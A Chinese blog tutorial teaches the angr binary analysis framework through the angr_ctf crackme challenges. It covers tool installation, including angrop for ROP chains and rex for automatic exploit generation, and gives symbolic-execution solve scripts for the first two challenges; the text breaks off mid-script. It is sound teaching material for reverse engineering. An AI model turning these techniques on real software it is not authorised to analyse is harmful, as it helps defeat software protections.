

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="你说的对，但是 angr 是一个使用 Python 编写的跨平台开源二进制分析框架…">
<meta property="og:type" content="article">
<meta property="og:title" content="【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法">
<meta property="og:url" content="https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="你说的对，但是 angr 是一个使用 Python 编写的跨平台开源二进制分析框架…">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/11/24/QCpmXeUbcNdozOB.png">
<meta property="article:published_time" content="2022-11-23T15:48:35.000Z">
<meta property="article:modified_time" content="2023-09-14T14:44:15.343Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="angr">
<meta property="article:tag" content="信息安全">
<meta property="article:tag" content="符号执行">
<meta property="article:tag" content="二进制安全">
<meta property="article:tag" content="二进制分析">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/11/24/QCpmXeUbcNdozOB.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法 - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"arttnba3.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-11-24 02:48" pubdate>
          2022年11月24日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          47k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          394 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2023年9月15日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>你说的对，但是 <a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制分析框架…</p>
<span id="more"></span>

<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制<strong>混合</strong>（Concolic）分析框架，为我们提供了一系列实用的二进制分析工具，更多关于 angr 的介绍信息可以看他们的 <a target="_blank" rel="noopener" href="https://angr.io/">官网</a> ，关于 angr 提供的 API 则可以查看<a target="_blank" rel="noopener" href="https://api.angr.io/">文档</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> 是一个非常好的入门级 angr 练手项目，刚好笔者最近在学 angr 相关的东西，所以决定从这个项目开始入门</p>
<h2 id="PRE-安装-angr-及相关组件"><a href="#PRE-安装-angr-及相关组件" class="headerlink" title="PRE.安装 angr 及相关组件"></a>PRE.安装 angr 及相关组件</h2><p>首先是一些依赖项：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure>

<p>angr 本体安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure>

<p>然后是 <a target="_blank" rel="noopener" href="https://github.com/angr/angrop">angrop</a>，可以自动收集 ROP gadget 以及构建 ROP chain</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/angr/patcherex">patcherex</a> 也是 angr 团队开发的，用以进行自动化的二进制加固</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>阿里云源好像妹有 <code>compilerex</code> 这个依赖项，反正最后👴也妹安装上，难受</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/angr/rex">rex</a> 则是 angr 团队开发的自动 exp 生成器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">👴妹安成，看看就好</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/angr/angr-management">angr-management</a> 则是图形化的 angr 界面，安好之后直接在终端输入 <code>angr-management</code> 即可直接启动</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure>

<h2 id="PRE2-angr-ctf-基本食用指北"><a href="#PRE2-angr-ctf-基本食用指北" class="headerlink" title="PRE2. angr-ctf 基本食用指北"></a>PRE2. angr-ctf 基本食用指北</h2><p>首先把项目拉到本地：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure>

<p>之后进入到你想做的题目目录下使用脚本进行编译，比如说 <code>00_angr_find</code>，这里需要我们手动指定一个种子以及输出的文件名：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure>

<h1 id="0x01-angr-ctf：基本用法"><a href="#0x01-angr-ctf：基本用法" class="headerlink" title="0x01. angr-ctf：基本用法"></a>0x01. angr-ctf：基本用法</h1><h2 id="00-angr-find：路径搜索"><a href="#00-angr-find：路径搜索" class="headerlink" title="00_angr_find：路径搜索"></a>00_angr_find：路径搜索</h2><p>惯例拖进 IDA，发现其会读入 8 字节后使用一个自定义函数处理，最后与密码 <code>&quot;XFQUUEQF&quot;</code> 对比：<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>按照传统的做逆向的方法是去逆 <code>complex_function()</code> ，逆出逻辑后写出解密脚本，但有了 angr 之后我们便可以使用<strong>符号执行</strong>（symbolic execution）来进行路径约束的自动求解</p>
<blockquote>
<p>符号执行简单理解便是将变量作为符号存储，通过分析路径约束获得由符号组成的表达式组，最后对其进行求解</p>
</blockquote>
<p>那么我们需要求解的路径约束便是执行到输出 <code>&quot;Good Job.&quot;</code> 的路径，这里笔者选择最后的输出点 <code>0x80492F0</code>：</p>
<p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么现在我们来看 angr 的基本用法</p>
<h3 id="angr-Project-顶层接口"><a href="#angr-Project-顶层接口" class="headerlink" title="angr.Project - 顶层接口"></a>angr.Project - 顶层接口</h3><p>我们若要使用 angr 来分析一个二进制文件，第一步则是创建一个 <code>angr.Project</code> 类——我们一切后续操作都将基于这个类实例进行展开，以下是一个🌰：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure>

<p>首先，我们可以通过一个 project 获取对应二进制文件的基本信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>arch</code> 是一个 <code>archiinfo.Arch</code> 类实例，其包含了运行该文件的 CPU 信息等各种数据</p>
<ul>
<li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ：CPU 的字长（单位为位&#x2F;字节）</p>
</li>
<li><p><code>arch.name</code>：架构名，例如  <em>X86</em>  </p>
</li>
<li><p><code>arch.memory_endness</code>：端序，大端为 <code>Endness.BE</code> ，小端为 <code>Endness.LE</code></p>
<blockquote>
<p>源码里还有一个 “中端序” <code>Endness.ME</code> ：）</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="①-factory-实用类工厂"><a href="#①-factory-实用类工厂" class="headerlink" title="① factory - 实用类工厂"></a>① factory - 实用类工厂</h4><p><code>project.factory</code> 为我们提供了一些实用的类的构造器</p>
<h5 id="I-block-基本块"><a href="#I-block-基本块" class="headerlink" title="I. block - 基本块"></a>I. block - 基本块</h5><p>angr 以基本块为单位分析代码，我们可以通过 <code>project.factory.block(address)</code> 获取给定地址所在的<strong>基本块</strong>——一个 <code>Block</code> 类实例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure>

<h5 id="II-state-模拟执行状态"><a href="#II-state-模拟执行状态" class="headerlink" title="II. state - 模拟执行状态"></a>II. state - 模拟执行状态</h5><p>angr 使用 <code>SimState</code> 类表示一个 <em>模拟的程序状态</em>  （simulated program state），我们的各种操作实际上是由一个 state 步进到另一个 state 的过程</p>
<p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个  <em>位向量</em>  （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）</li>
<li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）</li>
<li><code>state.memory</code>：另一种形式的内存访问接口：<ul>
<li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li>
<li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li>
</ul>
</li>
<li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流</li>
</ul>
<p>除了这些对模拟执行状态的信息获取接口外，还有一些解决方法的对应接口 <code>state.solver</code>，我们将在后续进行讲解</p>
<h5 id="III-simulation-manager-模拟执行器"><a href="#III-simulation-manager-模拟执行器" class="headerlink" title="III. simulation_manager - 模拟执行器"></a>III. simulation_manager - 模拟执行器</h5><p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行</li>
<li><code>simgr.explore(addr)</code>：路径探索，即<strong>执行到指定地址</strong>并进行约束求解，将执行完成的状态放在 <code>simgr.found</code> 列表中，若无法求解则该列表为空</li>
</ul>
<h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们现在已经了解了 angr 的基本使用方法了，而本题我们只需要探索到对应路径即可，于是最后的求解脚本如下，详见注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>一下就跑出来了，很快啊.mp4</p>
<p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="01-angr-avoid：路径避免"><a href="#01-angr-avoid：路径避免" class="headerlink" title="01_angr_avoid：路径避免"></a>01_angr_avoid：路径避免</h2><p>惯例拖入 IDA，发现太大了（流汗黄豆.jpg）</p>
<p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那这里我们手动分析一下，main 的逻辑还是惯例读入 8 字符作为 s1，而 s2 是一个固定值的字符串：</p>
<p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>之后大概就是会对 s1、s2 进行一定处理并在各种代码块间跳转，有的路径上会调用到 <code>avoid_me()</code> ，最后都会调用到 <code>maybe_good()</code> ：</p>
<p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么 <code>maybe_good()</code> 函数看样子应该是我们最终要求解的路径终点，只要满足两个条件：1）<code>should_succeed != 0</code> 2）<code>s1 == s2</code> 便说明我们成功了：</p>
<p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>而 <code>avoid_me()</code>会将变量 <code>should_succeed</code> 置 0，这意味着我们在执行时应该避免调用了该函数的路径：</p>
<p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>如果硬逆的话逻辑还是比较复杂的（<del>反正👴肯定不愿意手动逆</del>），于是我们还是可以使用 angr 进行求解，目标路径还是输出 <code>&quot;Good Job.&quot;</code>，不过这一题我们多了一个约束：避开 <code>avoid_me()</code> 函数的执行</p>
<p>如果我们不避开这个近乎无处不在的 <code>avoid_me()</code> 函数，则会造成<strong>路径爆炸</strong>（Path Explosion），从而大幅度增加求解时间，因此我们需要在路径约束的求解上避开该函数</p>
<h3 id="simgr-explore-的基本用法"><a href="#simgr-explore-的基本用法" class="headerlink" title="simgr.explore() 的基本用法"></a>simgr.explore() 的基本用法</h3><p>我们通常使用模拟器的 <code>.explore()</code> 方法来进行路径探索，传入的默认参数为 <code>find</code>——一个&#x2F;一组令模拟器终止运行的地址，符合的执行状态结果会被放到 <code>.found</code> 列表中</p>
<p>但除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的地址，当一个状态执行到这样的地址时，其会被放在 <code>.avoided</code> 列表中并不再往后执行</p>
<p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的解状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的解状态</p>
<h3 id="FINAL-EXPLOUT"><a href="#FINAL-EXPLOUT" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>现在我们知道该如何进行路径避免了，于是最后的求解脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span 